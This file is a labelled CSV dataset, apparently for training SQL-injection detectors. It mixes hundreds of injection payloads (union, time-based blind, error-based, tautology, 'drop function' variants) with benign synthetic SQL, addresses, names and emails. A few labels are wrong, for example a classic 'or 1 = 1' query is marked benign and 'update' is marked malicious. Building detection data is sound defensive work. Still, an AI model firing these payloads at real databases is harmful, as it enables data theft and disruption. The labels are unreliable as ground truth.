Query,Label
"calle grevol, 123 6?a",0
"select * from users where id = 1 union select null,banner from v$version where rownum = 1 -- 1",1
"escritor nicolas del paso, 95",0
SELECT * FROM CustomersFETCH FIRST 3 ROWS ONLY;,0
"1' ) ) as tgso where 1349 = 1349 union all select null,null,null,null--",1
end and 'hizd' = 'hizd,1
nanni-prucnal@fighting-machines.gf,0
SELECT heart,0
encrasar,0
"1' ) where 3450 = 3450 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
FROM ( SELECT DISTINCT Country FROM Customers ) ;,0
"-4121%"" ) union all select 2659,2659,2659,2659,2659,2659,2659,2659--",1
"-4543"" ) or 3038 = 3038",1
SELECT TOP 3 * FROM solve WHERE snow = 'possible',0
"1"" ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( ""felm"" = ""felm",1
SELECT * FROM reader WHERE will = 'boat' AND ( bare = 'vote' OR no = 'continued' ),0
"1"" ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
union ( select @@version ) --,1
"pera, la",0
"-6118 union all select 5906,5906,5906,5906,5906#",1
SELECT MIN ( whose ) AS whenever FROM sunlight,0
"1%"" ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ""%"" = """,1
"1' ) ) as hbdi where 6758 = 6758 and elt ( 1210 = 1210,sleep ( 5 ) ) --",1
"1"" where 1452 = 1452 union all select null,null,null,null--",1
"1' and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and 'jmub' = 'jmub",1
"1'+ ( select sshu where 3442 = 3442 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) +'",1
nada,0
04607227m,0
"calle morse, 17",0
carr97t8,0
"1%"" ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ""%"" = """,1
SELECT * FROM camera FETCH FIRST 50 PERCENT ROWS ONLY,0
"1, ( select ( case when ( 1570 = 1570 ) then ( select 1570 from pg_sleep ( 5 ) ) else 1/ ( select 0 ) end ) )",1
"-1079"" ) where 2865 = 2865 union all select 2865,2865,2865,2865,2865,2865,2865,2865,2865#",1
47172,0
select ( case when ( 8808 = 1367 ) then 1 else 8808* ( select 8808 from master..sysdatabases ) end ) --,1
"SELECT * FROM why WHERE rear NOT IN ( 'wagon', 'theory', 'battle' )",0
"1, ( select ( case when ( 9443 = 9443 ) then sleep ( 5 ) else 9443* ( select 9443 from information_schema.character_sets ) end ) )",1
ti7o,0
"1"" ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""gimc"" like ""gimc",1
SELECT * FROM think WHERE consist = 'face',0
carew1@koinup.ni,0
SELECT TOP 3 * FROM forgotten WHERE coast = 'boy' SELECT * FROM gently,0
SELECT pleasure ( s ) FROM wire LEFT JOIN,0
"1' ) ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ( 'sqnk' = 'sqnk",1
( select ( case when ( 9525 = 9280 ) then 9525 else 9525* ( select 9525 from master..sysdatabases ) end ) ),1
"1"" ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ""lide"" = ""lide",1
"1'|| ( select 'kgjk' where 3530 = 3530 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"1 where 2751 = 2751 union all select null,null,null,null--",1
or 'x' = 'x,1
select ( case when ( 4624 = 4844 ) then 4624 else 1/ ( select 0 ) end ) --,1
SELECT AVG ( but ) FROM coming,0
SELECT fine ( s ) FROM secret SELECT sea FROM nails,0
"1%"" union all select null,null,null,null,null,null,null,null--",1
"1"" ) as cxwd where 5800 = 5800 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
8930,0
select case when 5559 = 3483 then 1 else null end--,1
SELECT sale ( s ) FROM accident UNION ALL,0
SELECT * FROM down 3,0
SELECT * FROM ate WHERE Price NOT BETWEEN 10 AND 20,0
"1'+ ( select 'zxxh' where 4065 = 4065 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
SELECT saved FROM coffee UNION ALL SELECT energy FROM closely ORDER BY consist,0
"INSERT INTO seldom ( tomorrow, nearly, scientific ) VALUES ( 'grew', 'vegetable', 'tongue' )",0
"1%"" ) ) union all select null,null,null,null,null,null,null,null,null#",1
90660924f,0
"1"" ) ) union all select null,null--",1
SELECT COUNT ( bareID ) FROM riding,0
SELECT * FROM only FETCH FIRST 50 PERCENT ROWS ONLY,0
"calle manzanilla 141,",0
SELECT * FROM last,0
SELECT * FROM refused,0
"alonso de mendoza, 31 3b",0
geli febo,0
"select pg_sleep ( 5 ) and ( ""%"" = """,1
2.01871E+15,0
"1%"" union all select null,null,null--",1
15198367j,0
97649797p,0
"1%"" ) ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
"1%' ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
"SELECT hope,keep,good,bicycle,condition ( ( excellent JOIN main ON plant.cost = attention.date ) INNER JOIN lionON Orders.disease = quick.copyID )",0
garcilln,0
"-2782' ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
SELECT * FROM rubber ORDER BY telephone DESC,0
"SELECT story,run,dot FROM difficult LEFT JOIN Orders ON refer.arrangeID = dug.master ORDER BY curve.instance",0
basset ramos,0
5he1un,0
1213,0
18440,0
SELECT * FROM bent WHERE NOT tune = 'talk' AND NOT flag = 'wait',0
"SELECT Orders.quicklyrID, Employees.about, Employees.deal FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.stoppedID ORDER BY Orders.divideID",0
SELECT TOP 50 PERCENT * FROM previous SELECT * FROM sale FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM judge,0
"1 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )",1
SELECT * FROM powerful WHERE NOT distant = 'observe',0
sixto,0
SELECT show FROM greatly UNION ALL SELECT view FROM red ORDER BY planet,0
"1 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) -- ivku",1
1'|| ( select 'agng' from dual where 3337 = 3337 rlike sleep ( 5 ) ) ||',1
"1 where 1326 = 1326 union all select null,null,null,null,null,null--",1
SELECT * FROM flag WHERE parallel BETWEEN 10 AND 20,0
SELECT * FROM sheep,0
"1%"" ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( ""%"" = """,1
esdrs,0
SELECT wherever ( s ) FROM degree INNER JOIN,0
SELECT * FROM slowly WHERE metal BETWEEN '1996-07-01' AND '1996-07-31',0
"calle manco, 109, 10-g",0
1' ) ) as vrwr where 3830 = 3830,1
"SELECT * FROM student ORDER BY party, golden",0
"1'|| ( select 'baur' from dual where 9384 = 9384 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
a8ique0r4r,0
"select * from generate_series ( 9058,9058,case when ( 9058 = 1183 ) then 1 else 0 end ) limit 1--",1
SELECT * FROM ordinary WHERE although BETWEEN 10 AND 20,0
"1%"" ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ""%"" = """,1
DELETE FROM somehow WHERE factor = 'fruit',0
"SELECT Orders.hairrID, Employees.farther, Employees.organization FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.vaporID ORDER BY Orders.horseID",0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type = 'acf-field' AND ( ( wp_posts.post_status = 'publish' ) ) AND wp_posts.post_name = 'field_5f6c881b67715' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
SELECT * FROM mill,0
"1"" ) where 7010 = 7010 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
SELECT TOP 50 PERCENT * FROM wait SELECT * FROM eight FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM present,0
"1"" ) as rqpp where 9383 = 9383 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
"1"" ) as ffon where 2738 = 2738 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",1
3411,0
7860,0
SELECT * FROM path WHERE ever BETWEEN '1996-07-01' AND '1996-07-31',0
"1' ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'akyc' = 'akyc",1
"1 ) as tjwa where 1173 = 1173 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",1
hernardo,0
"1' in boolean mode ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) #",1
"1"" ) ) as swix where 2459 = 2459 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",1
SELECT TOP 50 PERCENT * FROM one,0
1' ) where 6842 = 6842,1
"SELECT bad, us, flame FROM putting WHERE string IS NULL",0
"-5516'+ ( select 'bmlv' where 7188 = 7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",1
"1"" ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( ""abcw"" = ""abcw",1
"1,row ( 7937,5067 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 7937 = 7937,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 9974 union select 5497 union select 8209 union select 8147 ) a group by x )",1
kriz,0
"SELECT Employees.final, COUNT ( Orders.earlyID ) AS carFROM ( OrdersINNER JOIN which ON Orders.supportID = Employees.soilID )",0
"SELECT NULLIF ( 25, 25 ) ;",0
ikediek torrades,0
SELECT TOP 50 PERCENT * FROM raise,0
"1%"" ) ) union all select null,null,null,null,null,null,null,null--",1
"1"" ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""nevr"" like ""nevr",1
SELECT MIN ( explain ) AS wrote FROM eight,0
gering,0
1 ) where 1079 = 1079,1
"1"" ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( ""tepf"" = ""tepf",1
SELECT * FROM if WHERE cage = military,0
"1'+ ( select sxco where 1623 = 1623 union all select null,null--",1
"c/ juan rabadan 27, 6?a",0
1'+ ( select 'leok' where 4320 = 4320,1
"1' ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",1
SELECT * FROM also WHERE pleasant BETWEEN 10 AND 20,0
"-3169"" order by 1#",1
08enmand15a,0
retallac,0
"-6254%' ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
SELECT DISTINCT children FROM were,0
1'|| ( select 'lzzr' where 2477 = 2477,1
SELECT * FROM wet WHERE recent BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT option_value FROM wp_options WHERE option_name = '_options_twitter_url' LIMIT 1,0
bosier@opel-e-flex.bn,0
"1' ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 'edcm' like 'edcm",1
"1 where 5266 = 5266 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1
"SELECT COUNT ( sea ) , gasoline FROM fine BY kept",0
"1' ) as sjmt where 6541 = 6541 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
SELECT alike ( s ) FROM molecular INNER JOIN,0
1' ) where 5540 = 5540 waitfor delay '0:0:5'--,1
SELECT TOP 3 * FROM principal WHERE although = 'freedom',0
"c/ las chumberas, 38,",0
SELECT * FROM trade WHERE captured NOT LIKE '[mostly]%',0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ""psbz"" = ""psbz",1
select ( case when ( 3344 = 8103 ) then 3344 else 1/ ( select 0 ) end ) --,1
"SELECT Employees.tape, COUNT ( Orders.vegetableID ) AS weekFROM ( OrdersINNER JOIN volume ON Orders.effectID = Employees.numberID )",0
"1"" ) ) as mlid where 1047 = 1047 union all select null,null#",1
"-9046' ) ) as ymqc where 3733 = 3733 union all select 3733,3733,3733,3733,3733,3733,3733--",1
nealson,0
"select * from users where id = '1' or ( \ ) = 1 union select 1,@@VERSION -- 1'",1
"1' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( 'beju' like 'beju",1
hoste ustrell,0
"calle san roque, 84,",0
SELECT COUNT ( DISTINCT say ) FROM blind,0
"1 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",1
"-6431' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'ixix' like 'ixix",1
1 ) as lvfu where 5831 = 5831 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,1
"1' ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( 'ijyi' = 'ijyi",1
"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ""sfnj"" like ""sfnj",1
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( 'pfle' like 'pfle,1
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( '%' = '",1
"1'+ ( select rdpe where 6553 = 6553 or elt ( 6272 = 6272,sleep ( 5 ) ) ) +'",1
"-1503"" order by 1--",1
"1"" ) ) ) rlike ( select ( case when ( 6915 = 4531 ) then 1 else 0x28 end ) ) and ( ( ( ""jzzu"" = ""jzzu",1
"iif ( 5214 = 7412,1,1/0 )",1
-5147 or ( 8459 = 8459 ) *4906,1
"1%' ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( '%' = '",1
1i515s7d7d,0
1%' waitfor delay '0:0:5'--,1
SELECT COUNT ( high ) FROM pond,0
"select * from users where id = 1 or 1#""; union select null,version ( ) -- 1",1
marginet,0
update,1
SELECT * FROM safe WHERE wooden BETWEEN shorter09/01/1996exercise AND fireplace15/31/1996information,0
mallo etchart,0
"1"" ) as qmtx where 5280 = 5280 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
1.22869E+15,0
16646,0
"1"" where 6686 = 6686 or elt ( 6272 = 6272,sleep ( 5 ) ) --",1
"1 ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( 5468 = 5468",1
"SELECT being,older,distance,nobody,building ( ( tin JOIN reach ON again.noise = lost.appropriate ) INNER JOIN aliveON Orders.buried = speech.grandfatherID )",0
SELECT * FROM bridge FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM disease,0
if ( 7340 = 9813 ) select 7340 else drop function yppp--,1
charpini_daillie@inmobiliariahangar.ly,0
750,0
SELECT COUNT ( park ) FROM hang,0
"1"" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",1
gerola pugliesi,0
-2527 ) ) as oqpy where 7468 = 7468 or 3038 = 3038,1
DELETE FROM breeze WHERE magic = 'money',0
select case when 6229 = 2077 then 1 else null end--,1
select pg_sleep ( 5 ) and ( ( ( 'qslr' = 'qslr,1
"end and ""mdje"" like ""mdje",1
"-3562"" ) as eghl where 7094 = 7094 union all select 7094,7094,7094,7094#",1
SELECT * FROM sink WHERE create = 'important',0
6440,0
"select * from users where id = 11||1 union select 1,banner from v$version where rownum = 1 -- 1",1
"1%' ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( '%' = '",1
"SELECT COUNT ( couple ) , recent FROM serious BY golden",0
"-7146"" where 6431 = 6431 or 8548 = 5549--",1
1' where 2661 = 2661,1
"SELECT lower,cool,suggest,area,whenever ( ( salmon JOIN tried ON factor.smooth = army.definition ) INNER JOIN dishON Orders.girl = depth.shelterID )",0
l-e3a06l,0
"' AND IF((SELECT SUBSTRING(@@version,1,1))='M', WAITFOR DELAY '0:0:3', 0) --",1
benajas rodrguez,0
"calle garci-perez 41, 9?c",0
SELECT * FROM within WHERE famous BETWEEN 10 AND 20,0
inca,0
SELECT * FROM citizen WHERE game NOT LIKE '[task]%',0
"-7379 union all select 9813,9813,9813,9813,9813,9813,9813,9813--",1
"1' ) ) as kgiw where 7452 = 7452 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
sazarina_logue@gay-tantra.lc,0
chilel,0
a' or 1 = 1--,1
19224,0
"1%' ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1
"calle godelleta, s/n",0
"1"" ) as idwa where 2545 = 2545 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
"c/ cardenal rossell, 85,",0
"SELECT locate,suit,material,nearer,fall ( ( or JOIN halfway ON signal.image = am.write ) INNER JOIN favoriteON Orders.is = these.thinkID )",0
SELECT AVG ( increase ) FROM president SELECT SUM ( today ),0
1 ) ) as gygm where 4024 = 4024,1
"-3827"" ) or 8571 = 8571--",1
"1"" ) ) union all select null,null,null,null,null,null,null,null,null#",1
or 1 = 1#,1
"1' ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( 'lmoh' like 'lmoh",1
SELECT * FROM spirit,0
"1%"" ) ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
"SELECT column1 , column2, ... FROM table_name ;",0
1%' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( '%' = ',1
"1"" ) as tqxa where 6751 = 6751 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1
if ( 4194 = 4133 ) select 4194 else drop function tqhz--,1
"1"" ) as ranl where 5553 = 5553",1
UPDATE silly SET press = 'coach'WHERE manufacturing = 'fourth',0
"INSERT INTO prove ( hand, remain, teacher, chance, getting, experience ) VALUES ( 'regular', 'extra'. obtain', 'beyond', 'mirror', 'zoo', 'search' )",0
or ''^',1
SELECT * FROM floating WHERE occasionally = 'built' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM forgotten WHERE needs NOT LIKE '[creature]%',0
#NAME?,1
SELECT * FROM coach WHERE wonder LIKE '%know%',0
SELECT * FROM simple WHERE changing = 'like',0
"1' ) where 7658 = 7658 union all select null,null#",1
"SELECT * FROM friend WHERE castle NOT IN ( 'recall', 'post', 'four' )",0
SELECT AVG ( instrument ) FROM construction SELECT SUM ( finally ),0
"1' ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'dreq' = 'dreq",1
SELECT extra ( s ) FROM have UNION ALL,0
88280590n,0
"1' ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 'wfws' = 'wfws",1
"1"" ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",1
"1"" and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ""buzb"" = ""buzb",1
SELECT TOP 3 * FROM pet WHERE talk = 'face',0
"-1270'|| ( select 'mgdi' where 6785 = 6785 union all select 6785,6785#",1
6.14046E+15,0
24120558k,0
7150,0
ulano,0
SELECT TOP 3 * FROM down WHERE quarter = 'fifty',0
1 ) where 4573 = 4573,1
1' ) as ibaw where 2130 = 2130 and 9198 = 9198--,1
"1%"" ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( ""%"" = """,1
"1%' ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( '%' = '",1
"-6770"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",1
"1"" or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""cdai"" = ""cdai",1
select ( case when ( 4415 = 2051 ) then 4415 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1
-6310 or 6715 = 3399,1
SELECT negative ( s ) FROM various,0
SELECT * FROM manufacturing WHERE let NOT LIKE 'just%',0
"admin"" ) or ""1"" = ""1""/*",1
1%' rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1
SELECT storm ( s ) FROM hung,0
SELECT AVG ( Price ) FROM method,0
DELETE FROM at,0
"1'|| ( select 'svbf' where 7017 = 7017 or elt ( 6272 = 6272,sleep ( 5 ) ) ) ||'",1
"1' ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'tfnb' = 'tfnb",1
"umbria, 143,",0
1' ) where 7478 = 7478,1
03331390r,0
SELECT COUNT ( DISTINCT beautiful ) FROM lying,0
"select * from generate_series ( 3990,3990,case when ( 3990 = 9597 ) then 1 else 0 end ) limit 1--",1
pampa,0
1 ) as mtda where 3951 = 3951,1
"SELECT UserId, Name, PasswordFROM Users WHERE UserId = 105 or 1 = 1;",0
select ( case when ( 8978 = 1426 ) then 1 else 8978* ( select 8978 from master..sysdatabases ) end ) --,1
SELECT * FROM steam WHERE using = 'fellow' LIMIT 3,0
"-4927' ) ) union all select 1924,1924#",1
1'+ ( select 'kcix' where 1117 = 1117,1
dalenna,0
SELECT * FROM for WHERE angry = answer,0
"1 ) as wxms where 7272 = 7272 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
SELECT * FROM cage WHERE carbon LIKE '%pen%',0
garmasin,0
"1' ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( 'drvk' like 'drvk",1
FROM ( SELECT DISTINCT care FROM thy ),0
1'+ ( select 'hplm' where 4008 = 4008 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1
1' where 5778 = 5778,1
la,0
1 ) as oknr where 3228 = 3228,1
"1%' ) ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( '%' = '",1
SELECT variety ( s ) FROM choice INNER JOIN,0
SELECT hundred ( s ) FROM sort LEFT JOIN,0
48551498q,0
SELECT * FROM organized WHERE book NOT LIKE '[announced]%',0
SELECT * FROM pay ORDER BY upper,0
"-2766%' ) ) union all select 4458,4458,4458,4458,4458--",1
SELECT ring ( s ) FROM represent SELECT doctor ( s ),0
